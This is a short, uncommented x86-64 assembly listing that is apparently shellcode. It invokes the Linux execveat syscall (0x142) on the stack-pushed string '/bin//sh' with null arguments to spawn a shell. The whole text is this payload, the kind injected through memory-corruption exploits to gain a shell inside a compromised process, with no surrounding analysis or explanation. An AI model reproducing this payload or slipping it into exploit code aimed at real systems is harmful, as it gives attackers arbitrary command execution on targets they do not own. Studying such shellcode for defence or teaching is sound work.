bits 64
push   0x142
pop    rax
xor    rdx, rdx
push   rdx
mov    rdi, 0x68732f2f6e69622f
push   rdi
push   rsp
pop    rsi
mov    r8, rdx
mov    r10, rdx
syscall
sub    rsp, 16
